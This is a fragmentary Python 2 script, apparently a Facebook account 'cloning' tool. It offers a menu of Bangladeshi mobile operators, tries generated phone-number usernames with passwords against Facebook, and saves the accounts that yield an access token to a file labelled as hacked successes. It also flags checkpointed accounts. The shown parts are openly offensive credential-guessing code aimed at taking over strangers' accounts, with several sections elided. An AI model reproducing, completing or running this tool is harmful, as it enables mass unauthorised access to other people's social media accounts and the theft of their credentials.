...
os.system('clear')
psb('\x1b[1;32mBANGLADESH 11 DIGIT PARSONAL  CLONING START PLEASE WAIT ..........')
...
logo = '\x1b[1;97m--------------------------------------------------\n      ---> Create to by -> Fahad  <--- \n\x1b[1;97m-------------------------------------------------- \n\x1b[1;97m     Facebook -> facebook.com/Fahad.2009 \x1b[00m\n\x1b[1;97m--------------------------------------------------\n    ---> Github -> github.com/Fahad-120 <--- \n\x1b[1;97m--------------------------------------------------'
...
def menu():
    ...
    print '\x1b[1;91mAUTHOR  : Fahad'
    print '\x1b[1;91mFACEBOOK : Mohammad Fahad '
    print '\x1b[1;91mGITHUB  : github.com/Fahad-1445'
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    ...
    print
    print '\x1b[1;92m[1]  ROBI (Fahad)'
    print '\x1b[1;92m[2]  AIRTEL(Fahad)'
    print '\x1b[1;92m[3]  BANGLALINK(OLD)'
    print '\x1b[1;92m[4]  BANGLALINK(NEW)'
    print '\x1b[1;92m[5]  GRAMEEN(Fahad)'
    print '\x1b[1;92m[6]  TELETALK(Fahad)'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Fahad-HACK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[Fahad-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
